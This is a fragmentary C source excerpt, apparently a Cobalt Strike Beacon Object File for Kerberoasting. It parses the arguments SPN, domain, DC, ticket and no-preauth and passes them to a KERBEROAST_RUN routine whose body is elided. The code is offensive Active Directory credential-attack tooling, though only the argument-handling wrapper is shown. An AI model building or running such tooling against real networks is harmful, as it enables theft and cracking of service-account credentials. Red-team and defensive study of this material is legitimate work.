...
void KERBEROAST_RUN(char* spn, char* domain, char* dc, char* ticket, char* nopreauth) {
...
VOID go( IN PCHAR Buffer, IN ULONG Length ) {
    ...
    char* spn = BeaconDataExtract(&parser, NULL);
    char* domain = BeaconDataExtract(&parser, NULL);
    char* dc = BeaconDataExtract(&parser, NULL);
    char* ticket = BeaconDataExtract(&parser, NULL);
    char* nopreauth = BeaconDataExtract(&parser, NULL);

    if (spn && my_strlen(spn) == 0) spn = NULL;
    if (domain && my_strlen(domain) == 0) domain = NULL;
    if (dc && my_strlen(dc) == 0) dc = NULL;
    if (ticket && my_strlen(ticket) == 0) ticket = NULL;
    if (nopreauth && my_strlen(nopreauth) == 0) nopreauth = NULL;

    if( LoadFunc() )
        PRINT_OUT("%s\n", "Modules not loaded");
    else
        KERBEROAST_RUN( spn, domain, dc, ticket, nopreauth );
